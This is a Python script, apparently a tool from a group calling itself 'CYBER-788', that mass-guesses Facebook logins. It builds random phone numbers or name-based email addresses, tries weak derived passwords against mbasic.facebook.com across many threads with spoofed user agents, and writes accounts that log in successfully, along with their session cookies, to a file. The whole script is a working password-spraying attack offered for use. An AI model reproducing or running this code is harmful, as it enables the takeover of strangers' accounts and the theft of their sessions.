# -----------------[ CYBER-788 ]-------------------#
#GIFT FOR Legend 
#GithHub :  https://githubcom/RozhakXD/Ezlikers
#OWNER : tan-vir
#TEAM : CYBER-788
# -----------------[ CYBER-788 ]-------------------#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
os.system("xdg-open https://www.facebook.com/profile.php?id=100080269757989&mibextid=ZbWKwL")
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='ASUS_I006D Build/RKQ1.201022.002'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Sleipnir/3.5.28'
	uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakua)

logo = ("""
\033[1;93m _______   _______ ___________     ___________  _____ 
\033[1;92m/  __ \ \ / / ___ \  ___| ___ \   |___  /  _  ||  _  |
\033[1;93m| /  \/\ V /| |_/ / |__ | |_/ /_____ / / \ V /  \ V / 
\033[1;92m| |     \ / | ___ \  __||    /______/ /  / _ \  / _ \ 
\033[1;93m| \__/\ | | | |_/ / |___| |\ \    ./ /  | |_| || |_| |
\033[1;92m \____/ \_/ \____/\____/\_| \_|   \_/   \_____/\_____/
                                                      
                                                      
	       \033[1;94m["WELCOME TO OUR world ðŸŒ"]
                                                           
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m CREATED BY\33[0;m   : \033[1;96mTanvir Hossen 
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m FACEBOK      : \033[1;34mTanvir Hossen 
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m GITHUB       : \033[1;35mHares-788-Cyber      
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL STATUS  : \033[1;36mRendom   
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TEAM         : \033[1;35mCyber-788                 
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL VIRSION : \033[1;36m1.0                   
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
""")
class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print(f" \033[38;5;46m♧♧♧♧♧♧♧♧♧♧♧♧TNVIR♧♧♧♧♧♧♧♧♧♧♧♧♧♧♧♧♧♧♧♧")
        print(" [01] \033[38;5;46m𝙍𝘼𝙉𝘿𝙊𝙈-𝙉𝙐𝙈𝘽𝙀𝙍-𝘾𝙇𝙊𝙉𝙀 [𝙒𝙊𝙍𝙆𝙄𝙉𝙂")
        print(" [02] \033[38;5;46m𝙍𝘼𝙉𝘿𝙊𝙈-𝙂𝙈𝘼𝙄𝙇-𝘾𝙇𝙊𝙉𝙀 [𝙒𝙊𝙍𝙆𝙄𝙉𝙂] ")
        print(" [00] \033[38;5;46mEXIT-WAY")
        print(f" \033[38;5;46m")
        Mumit =input(" [?] 𝘾𝙃𝙊𝙊𝙎𝙀___((((🖤)))) : ")
        if Mumit in ["1", "01"]:
            num()
        if Mumit in ["2","02"]:
            gml()
        if Mumit in [" 0", "00"]:
            exit()
        else:
            exit()
def num():
    user=[]
    os.system('clear')
    print(logo)
    print(' [+] \033[1;93m EXAMPLE : 017, 018, 019, 016, 013, 014 ')
    
    kode = input(' [?] Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print(' [+] \033[1;93m EXAMPLE : 3000, 5000, 10000, 50000 ')
   
    limit = int(input(' [?] Crack Your Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[38;5;46m[+] 𝙏𝙊𝙏𝘼𝙇{{{𝙄𝘿𝙎}}}:\033[38;5;46m '+tl)
        print(f" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
        print("\033[38;5;46m┌━━━━━━━━━━━━━━━┐        \033[38;5;46m┌━━━━━━━━━━━━━━━━┐")
        print(f'\033[38;5;46m│ \033[38;5;46m𝙔𝙊𝙐𝙍 𝘾𝙃𝙊𝙄𝘾𝙀   \033[38;5;46m│       \033[38;5;46m │    \033[38;5;46m𝙀𝙈𝙇/𝘾𝙇𝙊𝙉𝙀 \033[38;5;46m \033[38;5;46m │ ')
        print(f"\033[38;5;46m│ \033[38;5;46m𝘾𝙍𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏  \033[38;5;46m │     \033[38;5;46m   │   \033[38;5;46m𝙏𝙄𝙈𝙀/{dt_string}  \033[38;5;46m\033[38;5;46m │")
        print("\033[38;5;46m└━━━━━━━━━━━━━━━┘      \033[38;5;46m  └━━━━━━━━━━━━━━━━┘\n")
        print(f" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in Tanvir-ok.txt,Tanvir-cp.txt')

def gml():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' [+] \033[38;5;46mFAST NAME : ')
    os.system('clear')
    os.system('xdg-https://facebook.com/groups/1035734253633702/')
    print(logo)
    kodex = input(' [+] \033[38;5;46mLAST NAME :  ')
    os.system('clear')
    print(logo) 
    print(' [+] \033[38;5;46mEXAMPLE : @gmail.com, @yahoo.com ')
   
    doamin = input(' [?] \033[38;5;46mChoose doamin : ')
    os.system('clear')
    print(logo)
    print(' [+] \033[38;5;46mEXAMPLE : 3000, 5000, 10000, 50000 ')
    
    limit = int(input('[?] \033[38;5;46mCrack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[38;5;46m[+] 𝙏𝙊𝙏𝘼𝙇{{{𝙄𝘿𝙎}}}:\033[38;5;46m '+tl)
        print(f" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
        print("\033[38;5;46m┌━━━━━━━━━━━━━━━┐        \033[38;5;46m┌━━━━━━━━━━━━━━━━┐")
        print(f'\033[38;5;46m│ \033[38;5;46m𝙔𝙊𝙐𝙍 𝘾𝙃𝙊𝙄𝘾𝙀   \033[38;5;46m│       \033[38;5;46m │    \033[38;5;46m𝙀𝙈𝙇/𝘾𝙇𝙊𝙉𝙀 \033[38;5;46m \033[38;5;46m │ ')
        print(f"\033[38;5;46m│ \033[38;5;46m𝘾𝙍𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏  \033[38;5;46m │     \033[38;5;46m   │   \033[38;5;46m𝙏𝙄𝙈𝙀/{dt_string}  \033[38;5;46m\033[38;5;46m │")
        print("\033[38;5;46m└━━━━━━━━━━━━━━━┘      \033[38;5;46m  └━━━━━━━━━━━━━━━━┘\n")
        print(f" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] \033[38;5;46mCrack process has been completed')
    print(' [+] \033[38;5;46mIds saved in Tanvir-ok.txt,Tanvir-cp.txt')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92m[\033[38;5;46mBOSS__Tanvir]\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb =  {'authority': 'mbasic.facebook.com',
            'method':'GET',
            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
            'scheme':'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'referer': 'https://mbasic.facebook.com/',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Opera";v="96"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro }
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[Tanvir-OK🐼] {uid} | {ps}")
                print(f" Cookie : {coki}")
                open('/sdcard/Tanvir-ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f"\x1b[38;5;196m[Tanvir-CP🍾] {uid}|{ps}")
                #open('/sdcard/Tanvir-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[38;5;46m[Cyber-788] \033[38;5;46m%s\033[38;5;46m |\033[m[\033[38;5;46mOK:\033[\033[38;5;46m%s\033[38;5;46m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()